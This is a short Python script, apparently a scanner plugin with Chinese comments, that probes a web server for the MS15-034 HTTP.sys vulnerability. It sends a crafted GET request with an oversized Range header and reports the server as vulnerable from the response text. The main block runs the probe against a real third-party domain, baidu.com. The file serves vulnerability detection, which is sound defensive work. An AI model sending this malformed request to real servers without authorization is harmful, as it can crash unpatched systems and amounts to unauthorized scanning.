#!/usr/bin/env python3

'''
name: MS15-034漏洞
description: MS15-034 HTTP.sys远程代码执行漏洞
'''

import socket
from urllib.parse import urlparse

class MS15_034_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.timeout = 60
        url_parse = urlparse(self.url)
        self.host = url_parse.hostname
        self.port = url_parse.port
        if not self.port:
            self.port = '80'

    def run(self):
        try:
            socket.setdefaulttimeout(self.timeout)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.host, int(self.port)))
            flag = "GET / HTTP/1.0\r\nHost: stuff\r\nRange: bytes=0-18446744073709551615\r\n\r\n".encode('utf-8')
            s.send(flag)
            data = s.recv(1024)
            s.close()
            if 'Requested Range Not Satisfiable' in data.decode('utf-8') and 'Server: Microsoft' in data.decode('utf-8'):
                print("存在MS15-034 HTTP.sys远程代码执行漏洞")
                return True
            else:
                print("不存在MS15-034 HTTP.sys远程代码执行漏洞")
                return False
        except Exception as e:
            print(e)
            print("不存在MS15-034 HTTP.sys远程代码执行漏洞")
            return False
        finally:
            pass

if  __name__ == "__main__":
    MS15_034 = MS15_034_BaseVerify('http://baidu.com')
    MS15_034.run()